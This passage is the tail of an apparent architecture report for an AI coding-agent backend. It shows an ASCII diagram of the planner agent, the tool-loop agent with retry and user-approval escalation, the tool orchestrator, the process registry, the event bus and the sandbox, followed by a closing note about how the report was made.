│                 BACKEND (Express :3001)                   │
│                                                          │
│  ┌─────────────────────────────────────────────────┐    │
│  │              PLANNER AGENT                       │    │
│  │  - Decomposes goal into subtask list             │    │
│  │  - Writes .nura/plan.md                          │    │
│  └─────────────────┬───────────────────────────────┘    │
│                    │ subtasks                             │
│  ┌─────────────────▼───────────────────────────────┐    │
│  │         TOOL-LOOP AGENT (per subtask)            │    │
│  │  Observe → Think (streaming) → Act → Verify      │    │
│  │  Self-heal: error → patch → retry (max 3)        │    │
│  │  Escalate: diff → user approval → continue       │    │
│  └─────────────────┬───────────────────────────────┘    │
│                    │                                     │
│  ┌─────────────────▼───────────────────────────────┐    │
│  │           TOOL ORCHESTRATOR (38 tools)           │    │
│  │  file | shell | package | server | git | db      │    │
│  │  All routed through ProcessRegistry for runtime  │    │
│  └─────────────────┬───────────────────────────────┘    │
│                    │                                     │
│  ┌─────────────────▼───────────────────────────────┐    │
│  │         UNIFIED PROCESS REGISTRY                 │    │
│  │  Single Map: projectId → { pid, port, proc }     │    │
│  │  Feeds: console bus, preview proxy, recovery     │    │
│  └─────────────────┬───────────────────────────────┘    │
│                    │                                     │
│  ┌─────────────────▼───────────────────────────────┐    │
│  │              EVENT BUS                           │    │
│  │  agent.event | console.log | file.change |       │    │
│  │  run.lifecycle | agent.token | agent.diff        │    │
│  └─────────────────┬───────────────────────────────┘    │
│                    │                                     │
│  ┌─────────────────▼───────────────────────────────┐    │
│  │           SANDBOX (.data/sandboxes/:id)          │    │
│  │  Git-tracked | checkpoint per subtask            │    │
│  │  .nura/context.md → cross-run memory             │    │
│  └─────────────────────────────────────────────────┘    │
│                                                          │
│  PostgreSQL: projects | agentRuns | checkpoints          │
└──────────────────────────────────────────────────────────┘
```

---

*Report generated via evidence-based analysis of actual source files. All findings reference exact files and line numbers. No assumptions were made without code evidence.*
